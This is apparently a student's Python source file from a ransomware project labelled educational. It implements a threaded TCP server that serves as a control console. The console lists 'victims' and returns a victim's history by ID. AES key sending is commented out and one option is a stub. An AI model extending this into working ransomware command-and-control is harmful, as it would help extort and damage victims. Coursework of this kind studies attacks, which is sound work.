#!/usr/bin/python
# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
from _thread import start_new_thread

import configgetter as config
import security
import os
import utile.data as udata


# --------------------------------------------
# Classes & Functions
# --------------------------------------------

class server_tcp(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.encryptkey = os.urandom(32)
        self.print_lock = threading.Lock()

    def start_server(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            self.s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        self.s.listen(10)
        while True:
            self.conn, self.addr = self.s.accept()
            self.print_lock.acquire()
            print(f'[+] New TCP Connexion from ' + str(self.addr[0]) + ":" + str(self.addr[1]))
            start_new_thread(self.threaded, (self.conn,))
        # Implémentation sécurité : AES
        # conn.send(bytes(str(key), 'utf-8'))
        # conn.send(bytes(str(nonce), 'utf-8'))
        # conn.send(bytes(str(tag), 'utf-8'))
        self.s.close()



    def gestion_msg(self, message):
        if message == '1':
            return udata.list_victim()
        elif message == '2':
            self.conn.send(bytes('Please provide an user ID for the history', 'utf-8'))
            id = self.conn.recv(1024).decode()
            return udata.history_req(id)
        elif message == '3':
            return "Todo3"

    def threaded(self, c):
        print('New thread started')
        while True:
            data = c.recv(1024).decode()
            if not data:
                print('Bye')
                self.print_lock.release()
                break
            print(str(self.addr[0]) + " >> " + data)
            rs = str(self.gestion_msg(data))
            # @Todo: Build header & send it before msg
            c.send(bytes(rs, 'utf-8'))

        c.close()


srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
srv.start_server()
